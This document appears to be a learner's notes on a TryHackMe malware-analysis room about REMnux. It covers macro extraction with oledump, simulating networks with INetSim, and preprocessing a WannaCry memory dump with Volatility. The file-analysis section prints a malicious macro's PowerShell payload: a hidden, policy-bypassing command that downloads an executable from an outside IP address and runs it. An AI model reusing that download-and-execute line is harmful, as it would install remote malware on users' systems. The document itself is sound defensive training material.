# TryHackMe Room: REMnux: Getting Started

**Path:** Defensive Security Tooling
**Module Type:** Malware Analysis + DFIR Environment
**Difficulty:** Beginner–Intermediate
**Status:** Completed

---

# Summary

This room introduces **REMnux**, a specialized Linux distro for malware analysis and DFIR.

It covers:

* Static analysis of malicious documents
* Macro + PowerShell payload analysis
* Fake network simulation using INetSim
* Memory forensics preprocessing using Volatility
* Evidence preprocessing workflows

---

# Rooms in This Module

| Order | Section       | Primary Focus        | Status |
| ----- | ------------- | -------------------- | ------ |
| 1     | Intro         | REMnux overview      | ✔      |
| 2     | Access        | VM usage             | ✔      |
| 3     | File Analysis | OLE + macros         | ✔      |
| 4     | Fake Network  | INetSim              | ✔      |
| 5     | Memory        | Volatility + strings | ✔      |
| 6     | Conclusion    | Wrap-up              | ✔      |

---

# Key Concepts Covered

* OLE document analysis
* VBA macro extraction
* PowerShell payload analysis
* Fake network simulation
* Memory forensics preprocessing
* DFIR evidence preparation

---

# Room Notes & Task Breakdown

---

## Task 1: Introduction

**Room Objective:**
Understand REMnux as a malware analysis environment.

---

### Key Learning

* REMnux = ready-to-use malware lab
* Safe environment for analysis

---

### Insight

> Always analyze malware in isolated environments

---

## Task 2: Machine Access

**Room Objective:**
Understand file structure and environment setup.

---

### Key Learning

* Files located in:

```
/home/ubuntu/Desktop/tasks/
```

---

### Insight

> Always know your working directory before analysis

---

## Task 3: File Analysis (OLE + Macros)

**Room Objective:**
Analyze malicious document and extract payload.

---

### Tool Used

* `oledump.py`

---

### Command

```bash
oledump.py agenttesla.xlsm
```

---

### Key Findings

* VBA macro detected
* Data streams identified
* Macro located in:

```
VBA/ThisWorkbook
```

---

### Extract Macro

```bash
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

---

### Extracted Payload

```powershell
powershell -WindowStyle hidden -executionpolicy bypass;
Invoke-WebRequest -Uri http://193.203.203.67/rt/Doc-3737122pdf.exe -OutFile $TempFile;
Start-Process $TempFile;
```

---

### Key Learning

* Macros = initial access vector
* PowerShell = execution mechanism

---

### Insight

> Document → Macro → PowerShell → Payload → Execution

---

## Task 4: Fake Network (INetSim)

**Room Objective:**
Simulate malware network activity safely.

---

### Setup

```bash
sudo nano /etc/inetsim/inetsim.conf
```

---

### Configuration Change

```
dns_default_ip = MACHINE_IP
```

---

### Start INetSim

```bash
sudo inetsim
```

---

### Simulated Download

```bash
sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
```

---

### Key Learning

* Malware often downloads second-stage payloads
* Logs provide critical forensic evidence

---

### Log Location

```
/var/log/inetsim/report/
```

---

### Insight

> INetSim allows safe observation of malware behavior without real internet access

---

## Task 5: Memory Investigation (Volatility)

**Room Objective:**
Analyze memory dump for suspicious activity.

---

### Memory File

```
wcry.mem
```

---

### Key Commands

```bash
vol3 -f wcry.mem windows.pstree.PsTree
vol3 -f wcry.mem windows.pslist.PsList
vol3 -f wcry.mem windows.cmdline.CmdLine
vol3 -f wcry.mem windows.filescan.FileScan
vol3 -f wcry.mem windows.dlllist.DllList
vol3 -f wcry.mem windows.psscan.PsScan
vol3 -f wcry.mem windows.malfind.Malfind
```

---

### Key Learning

* Memory reveals hidden processes and artifacts
* Use multiple plugins for full visibility

---

### Bulk Processing

```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

---

### Strings Extraction

```bash
strings wcry.mem > wcry.strings.ascii.txt
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

---

### Insight

> Preprocessing speeds up real-world DFIR investigations

---

## Task 6: Conclusion

---

### Key Takeaways

* REMnux provides a complete DFIR lab
* Covers:

  * File analysis
  * Network simulation
  * Memory forensics

---

# Tools Used

* oledump.py
* CyberChef
* INetSim
* Volatility
* strings

---

# Reflection

This module builds a strong DFIR foundation:

* Malware analysis workflow
* Payload extraction
* Network simulation
* Memory investigation

---

### From a Blue Team / SOC POV

* Macro-based initial access detection
* PowerShell execution monitoring
* Suspicious outbound connections
* Memory artifact analysis
